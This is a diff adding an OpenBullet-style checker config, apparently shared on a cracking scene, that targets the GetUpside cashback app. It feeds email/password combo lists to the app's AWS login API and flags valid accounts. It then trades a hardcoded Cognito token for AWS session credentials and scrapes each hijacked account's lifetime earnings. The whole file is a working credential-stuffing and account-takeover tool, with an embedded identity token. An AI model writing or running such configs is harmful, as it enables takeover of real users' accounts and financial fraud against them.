@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "GetUpside",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-22T22:21:15.0807082+05:30",
+  "AdditionalInfo": "",
+  "Author": "XPERTY",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://z2ni5sknta.execute-api.us-east-1.amazonaws.com/7_0_0/user/auth" 
+  CONTENT "{\"email\":\"<USER>\",\"clearTextPassword\":\"<PASS>\",\"emailOrigin\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Content-Length: 66" 
+  HEADER "Host: z2ni5sknta.execute-api.us-east-1.amazonaws.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: Upside%20AppStore/2 CFNetwork/1121.2.2 Darwin/19.3.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "code\": \"SUCCESS" 
+  KEYCHAIN Failure OR 
+    KEY "Email/password incorrect" 
+  KEYCHAIN Retry OR 
+    KEY "{\"cognitoIdentity\": null" 
+
+PARSE "<SOURCE>" JSON "userUuid" -> VAR "uid" 
+
+REQUEST POST "https://cognito-identity.us-east-1.amazonaws.com/" 
+  CONTENT "{\"Logins\":{\"cognito-identity.amazonaws.com\":\"eyJraWQiOiJ1cy1lYXN0LTExIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NDJmNzY4ZjktYmJhMC00OGIyLWI0NWEtMWM4ZDliNzE2MjQ1IiwiYXVkIjoidXMtZWFzdC0xOjVkNjVmMzc5LWJlMGQtNDU2Zi1hOGRkLTQ3YTE5NzBhNWIyZCIsImFtciI6WyJhdXRoZW50aWNhdGVkIiwibG9naW4uY29uc3VtZXIiLCJsb2dpbi5jb25zdW1lcjp1cy1lYXN0LTE6NWQ2NWYzNzktYmUwZC00NTZmLWE4ZGQtNDdhMTk3MGE1YjJkOjNmM2ZmZDY0LWM0MDAtNDNmYi1iYzFiLTIzY2FmYmExODdlMSJdLCJpc3MiOiJodHRwczovL2NvZ25pdG8taWRlbnRpdHkuYW1hem9uYXdzLmNvbSIsImV4cCI6MTU4NzU4NTExNiwiaWF0IjoxNTg3NTYzNTE2fQ.earh_Tx1iG9DQlC2SwX57rWnmkxoDeZfWYZQOFkbBzsIBWcfuO44YWGuQGF-uo8ptO_JDz564oIw_pKOah_BEl9bNLW7fgoPmmIxv0dVBItJIOn5IKJVzHfQ2Qxtd70e-rlTXQdkPDxRTEbfFWjaa1JGOJ7GdYFRyKf-e4CnTGmwOmm75vxCdNvTx8xSBJETKRtnTP9fIYm1Z3mFWYVYQ-iaLFPpDV17nXhT6F8DFR-8Z4SE__XCdfVN0WGZXCmnNCwmCD80INt1_RxxVUc46-Wyfw1PMJRyoansKOVBUbjjFzix-1ePJhP9cq7ZxX5jUgPOfJL-dP1_HW-KWNHahQ\"},\"IdentityId\":\"us-east-1:42f768f9-bba0-48b2-b45a-1c8d9b716245\"}" 
+  CONTENTTYPE "application/x-amz-json-1.1" 
+  HEADER "Content-Type: application/x-amz-json-1.1" 
+  HEADER "X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: aws-sdk-iOS/2.13.1 iOS/13.3.1 en_US" 
+  HEADER "Content-Length: 962" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "X-Amz-Date: 20200422T135157Z" 
+
+PARSE "<SOURCE>" LR "\"AccessKeyId\":\"" "\",\"" -> VAR "AccessKey" 
+
+PARSE "<SOURCE>" LR "SessionToken\":\"" "\"}" -> VAR "SessionToken" 
+
+FUNCTION CurrentUnixTime -> VAR "Time2222" 
+
+FUNCTION UnixTimeToISO8601 "<Time2222>" -> VAR "Time" 
+
+FUNCTION Replace "-" "" "<Time>" -> VAR "hi" 
+
+FUNCTION Replace ":" "" "<hi>" -> VAR "hi2" 
+
+FUNCTION Replace ".000" "" "<hi2>" -> VAR "RealTime" 
+
+REQUEST GET "https://z2ni5sknta.execute-api.us-east-1.amazonaws.com/7_0_0/user/<uid>/offers" 
+  
+  HEADER "Host: z2ni5sknta.execute-api.us-east-1.amazonaws.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Authorization: AWS4-HMAC-SHA256 Credential=<AccessKey>/20200422/us-east-1/execute-api/aws4_request, SignedHeaders=accept;content-type;host;user-agent;x-amz-date;x-amz-security-token, Signature=n5f355d2bff68ad9ae377e4f6d524e09df2c578e57968e20b527bc95d33422db2" 
+  HEADER "X-Amz-Security-Token: <SessionToken>" 
+  HEADER "X-Amz-Date: <RealTime>" 
+
+PARSE "<SOURCE>" LR "ody\": \"Lifetime Earnings\\n{{earnings}}\", \"color\": \"#FFFFFF\", \"fontWeight\": \"NORMAL\", \"fontSize\": 16.0, \"variables\": [{\"key\": \"earnings\", \"value\": \"$" "\"" CreateEmpty=FALSE -> CAP "Earnings" 
+
